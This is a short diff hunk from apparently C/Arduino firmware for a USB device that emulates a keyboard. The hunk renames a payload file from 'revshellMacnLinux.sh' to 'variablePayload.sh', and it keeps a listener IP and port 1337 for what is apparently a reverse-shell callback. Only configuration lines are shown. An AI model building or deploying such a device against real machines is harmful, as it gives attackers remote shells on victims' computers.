@@ -3,7 +3,7 @@
 // THIS IS THE ACTUAL CODE GOING ON THE HID EMULATING USB
 
 // Define the payload name, IP, and PORT at the beginning
-const char* payloadName = "revshellMacnLinux.sh";
+const char* payloadName = "variablePayload.sh";
 const char* IP = "10.119.208.118";  // Replace with your IP address
 const char* PORT = "1337";      // Replace with your port number
 
